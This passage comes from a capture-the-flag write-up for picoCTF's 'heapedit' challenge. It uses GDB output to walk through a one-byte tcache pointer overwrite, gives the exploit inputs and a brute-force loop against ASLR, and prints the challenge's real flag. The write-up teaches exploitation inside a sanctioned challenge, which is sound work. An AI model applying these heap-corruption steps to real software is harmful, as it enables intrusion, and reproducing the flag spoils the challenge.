    <span class=mtk8>__stack_chk_fail</span><span class=mtk1>();</span>
  <span class=mtk1>}</span>

  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>It is using <code>malloc</code> to store two strings in the heap. The flag corresponds to the first <code>malloc</code>, the second <code>malloc</code> will be for a dummy message (i.e. &ldquo;Sorry! This won&rsquo;t help you: this is a random string.&rdquo;).</p><p>It is also releasing the chunks using <code>free</code>. And finally it is calling <code>malloc</code> again, so the last chunk that was released will be allocated, and then it prints the stored string.</p><p>Here, the order matters, because the last chunk that is released is the one that contains the random string.</p><p>The program gives us a chance to modify a single byte in a given address, let&rsquo;s see what we can do.</p><p>We will use GDB to debug the program breaking at <code>puts</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q heapedit_patched
Reading symbols from <span class=code-dark-green>heapedit_patched</span>...
(No debugging symbols found in <span class=code-dark-green>heapedit_patched</span>)
<span class=code-red>gef➤</span>  break puts
Breakpoint 1 at <span class=code-dark-blue>0x400690</span>
<span class=code-red>gef➤</span>  run
Starting program: ./heapedit_patched

Breakpoint 1, <span class=code-dark-yellow>_IO_puts</span> (<span class=code-dark-cyan>str</span>=0x400b18 "You may edit one byte in the program.") at <span class=code-dark-green>ioputs.c</span>:33  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  heap chunks
<span class="mtku code-yellow">Chunk</span>(addr=0x602010, size=0x250, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000602010     <span class=code-grey>00 00 00 00 00 00 00</span> <span class=code-dark-yellow>02</span> <span class=code-grey>00 00 00 00 00 00 00 00</span>    ................]  
<span class="mtku code-yellow">Chunk</span>(addr=0x602260, size=0x230, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000602260     <span class=code-dark-yellow>88</span> 24 <span class=code-dark-yellow>ad</span> <span class=code-dark-yellow>fb</span> <span class=code-grey>00 00 00 00</span> <span class=code-dark-yellow>a3</span> 24 60 <span class=code-grey>00 00 00 00 00</span>    .$.......$`.....]
<span class="mtku code-yellow">Chunk</span>(addr=0x602490, size=0x1010, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000602490     70 69 63 6f 43 54 46 7b 74 65 73 74 5f 66 6c 61    picoCTF{test_fla]
<span class="mtku code-yellow">Chunk</span>(addr=0x6034a0, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x603530, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x6035c0, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x603650, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x6036e0, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x603770, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x603800, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603800     <span class=code-grey>00 00 00 00 00 00 00 00</span> 21 20 59 6f 75 72 20 66    ........! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x603890, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603890     <span class=code-grey>00</span> 38 60 <span class=code-grey>00 00 00 00 00</span> 68 69 73 20 77 6f 6e 27    .8`.....his won']
<span class="mtku code-yellow">Chunk</span>(addr=0x603920, size=0x1f6f0, flags=<span class=code-red>PREV_INUSE</span>)  ←  <span class=code-dark-green>top chunk</span>
</code></pre></div><p>Here we can see a lot of things. First, there are 2 chunks in the Tcache (it is represented by the <code>02</code> in the first chunk of the output). The Tcache is a linked list of released chunks. It is used by <code>malloc</code> to allocate chunks faster because it will check if there are chunks in Tcache before requesting memory to the kernel.</p><p>The address of the next chunk to be allocated (the head of the linked list) is <code>0x603890</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/20gx 0x602000
<span class=code-dark-blue>0x602000</span>:       0x0000000000000000      0x0000000000000251  
<span class=code-dark-blue>0x602010</span>:       0x0200000000000000      0x0000000000000000
<span class=code-dark-blue>0x602020</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602030</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602040</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602050</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602060</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602070</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602080</span>:       0x0000000000000000      0x0000000000603890
<span class=code-dark-blue>0x602090</span>:       0x0000000000000000      0x0000000000000000
</code></pre></div><p>The previous output is the start of the heap address space. That chunk shown is a special chunk that stores the information that <code>malloc</code> uses to allocate chunks.</p><p>Let&rsquo;s see whats in the head of the Tcache (actually, <code>0x10</code> before to see the chunk metadata). It is a chunk of <code>0x90</code> bytes (the <code>1</code> in <code>0x91</code> means that the previous chunk is in use). It contains the random string:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/20gx 0x603880
<span class=code-dark-blue>0x603880</span>:       0x0000000000000000      0x0000000000000091
<span class=code-dark-blue>0x603890</span>:       0x0000000000603800      0x276e6f7720736968
<span class=code-dark-blue>0x6038a0</span>:       0x7920706c65682074      0x73696874203a756f
<span class=code-dark-blue>0x6038b0</span>:       0x6172206120736920      0x727473206d6f646e
<span class=code-dark-blue>0x6038c0</span>:       0x000000002e676e69      0x0000000000000000
<span class=code-dark-blue>0x6038d0</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x6038e0</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x6038f0</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x603900</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x603910</span>:       0x0000000000000000      0x000000000001f6f1
<span class=code-dark-blue>0x603920</span>:       0x0000000000000000      0x0000000000000000
<span class=code-green>gef➤</span>  x/s 0x603898
<span class=code-dark-blue>0x603898</span>:       "his won't help you: this is a random string."  
</code></pre></div><p>Let&rsquo;s continue and write <code>0</code> into the address <code>0</code> and see what happens:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
You may edit one byte in the program.
Address: 0
Value: 0

Breakpoint 1, <span class=code-dark-yellow>_IO_puts</span> (<span class=code-dark-cyan>str</span>=0x6038a0 "t help you: this is a random string.") at <span class=code-dark-green>ioputs.c</span>:33  
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  heap chunks
<span class="mtku code-yellow">Chunk</span>(addr=0x602010, size=0x250, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000602010     <span class=code-grey>00 00 00 00 00 00 00</span> <span class=code-dark-yellow>01</span> <span class=code-grey>00 00 00 00 00 00 00 00</span>    ................]  
<span class="mtku code-yellow">Chunk</span>(addr=0x602260, size=0x230, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000602260     <span class=code-dark-yellow>88</span> 24 <span class=code-dark-yellow>ad</span> <span class=code-dark-yellow>fb</span> <span class=code-grey>00 00 00 00</span> <span class=code-dark-yellow>a3</span> 24 60 <span class=code-grey>00 00 00 00 00</span>    .$.......$`.....]
<span class="mtku code-yellow">Chunk</span>(addr=0x602490, size=0x1010, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000602490     70 69 63 6f 43 54 46 7b 74 65 73 74 5f 66 6c 61    picoCTF{test_fla]
<span class="mtku code-yellow">Chunk</span>(addr=0x6034a0, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x00000000006034a0     30 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    0ongrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x603530, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x6035c0, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x603650, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x6036e0, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x603770, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x603800, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
<span class="mtku code-yellow">Chunk</span>(addr=0x603890, size=0x90, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603890     <span class=code-grey>00</span> 38 60 <span class=code-grey>00 00 00 00 00</span> 68 69 73 20 77 6f 6e 27    .8`.....his won']
<span class="mtku code-yellow">Chunk</span>(addr=0x603920, size=0x410, flags=<span class=code-red>PREV_INUSE</span>)
    [0x0000000000603920     30 <span class=code-dark-blue>0a</span> <span class=code-grey>00 00 00 00 00 00 00 00 00 00 00 00 00 00</span>    0...............]
<span class="mtku code-yellow">Chunk</span>(addr=0x603d30, size=0x1f2e0, flags=<span class=code-red>PREV_INUSE</span>)  ←  <span class=code-dark-green>top chunk</span>
</code></pre></div><p>Can you spot the difference? There is a <code>0ongrats!</code> instead of <code>Congrats!</code>. Hence, the address where we write is actually an offset, and the base address is <code>0x6034a0</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  grep 0ongrats
<span class=code-blue>[+]</span> Searching '<span class=code-dark-yellow>0ongrats</span>' in memory
<span class=code-green>[+]</span> In '<span class=code-dark-blue>[heap]</span>'(0x602000-0x623000), permission=rw-
  0x6034a0 - 0x6034cc  →   "<span class=code-dark-magenta>0ongrats! Your flag is: picoCTF{test_flag}\n</span>"  
</code></pre></div><p>Moreover, <code>puts</code> is using the string at <code>0x6038a0</code>, which is <code>0x603890 + 0x10</code>, the code actually performs this operation:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>  <span class=mtk1>last_malloc</span> <span class=mtk5>=</span> <span class=mtk8>malloc</span><span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>80</span><span class=mtk1>);</span>
  <span class=mtk8>puts</span><span class=mtk1>((</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>((</span><span class="mtk7 mtki">long</span><span class=mtk1>)</span> <span class=mtk1>last_malloc</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>));</span>  
</code></pre></div><p>We are going to modify <code>0x603890</code> inside the Tcache and change it for <code>0x603490</code> for example. That is, we will put <code>0x34</code> as the byte to write (which is <code>4</code> in ASCII).</p><p>Now we need to obtain the address where <code>0x603890</code> is stored in the heap. Recall this output:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/20gx 0x602000
<span class=code-dark-blue>0x602000</span>:       0x0000000000000000      0x0000000000000251  
<span class=code-dark-blue>0x602010</span>:       0x0200000000000000      0x0000000000000000
<span class=code-dark-blue>0x602020</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602030</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602040</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602050</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602060</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602070</span>:       0x0000000000000000      0x0000000000000000
<span class=code-dark-blue>0x602080</span>:       0x0000000000000000      0x0000000000603890
<span class=code-dark-blue>0x602090</span>:       0x0000000000000000      0x0000000000000000
</code></pre></div><p>The exact address of the byte <code>0x38</code> is <code>0x602089</code>. Let&rsquo;s verify it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/c 0x602089
<span class=code-dark-blue>0x602089</span>:       0x38  
</code></pre></div><p>Alright, so the offset we need is <code>0x602089 - 0x6034a0 = -5143</code>. Let&rsquo;s try it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q heapedit_patched
Reading symbols from <span class=code-dark-green>heapedit_patched</span>...
(No debugging symbols found in <span class=code-dark-green>heapedit_patched</span>)  
<span class=code-red>gef➤</span>  run
Starting program: ./heapedit_patched
You may edit one byte in the program.
Address: -5143
Value: 4
Congrats! Your flag is: picoCTF{test_flag}

[Inferior 1 (process 295925) exited normally]
</code></pre></div><p>It works in GDB, but not outside:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./heapedit_patched</span>
You may edit one byte in the program.
Address: -5143
Value: 4
zsh: segmentation fault (core dumped)  ./heapedit_patched  
</code></pre></div><p>After some time, I figured out what was hapenning. The thing is that the heap addresses suffer from ASLR, so all the addresses are randomized but the last three hexadecimal digits (as with Glibc or PIE binaries). We are modifying the fourth and third digits of an address, and that will not work always.</p><p>One way to solve this is trying multiple times:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-yellow>while</span> <span class=code-dark-green>true</span>; <span class=code-dark-yellow>do</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'-5143\n4'</span> | <span class=code-dark-green>./heapedit_patched</span>; <span class=code-dark-yellow>done</span> | <span class=code-dark-green>grep</span> picoCTF  
Address: Value: Congrats! Your flag is: <span class=code-red>picoCTF</span>{test_flag}
</code></pre></div><p>And it also works on the remote instance:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-yellow>while</span> <span class=code-dark-green>true</span>; <span class=code-dark-yellow>do</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'-5143\n4'</span> | <span class=code-dark-green>nc</span> mercury.picoctf.net 8054; <span class=code-dark-yellow>done</span> | <span class=code-dark-green>grep</span> picoCTF  
Address: Value: Congrats! Your flag is: <span class=code-red>picoCTF</span>{5c9838eff837a883a30c38001280f07d}
</code></pre></div><p>There is a more elegant solution, which is modifying the first and second digits (which will not change due to ASLR). For instance, we may change <code>0x603890</code> to be <code>0x603800</code> (which is the address of the previous chunk) in the example above. We also need to substract 1 to the address offset (that is <code>-5144</code>).</p><p>It works always and both locally and remotely:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'-5144\n\0'</span> | <span class=code-dark-green>./heapedit_patched</span>
You may edit one byte in the program.
Address: Value: lag is: picoCTF{test_flag}

<span class=code-cyan>$</span> <span class=code-dark-green>echo</span> <span class=code-dark-yellow>'-5144\n\0'</span> | <span class=code-dark-green>nc</span> mercury.picoctf.net 8054
You may edit one byte in the program.
Address: Value: lag is: picoCTF{5c9838eff837a883a30c38001280f07d}  
</code></pre></div><div class="mt6 instapaper_ignoref">
</div></div></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></div></div></footer></body></html>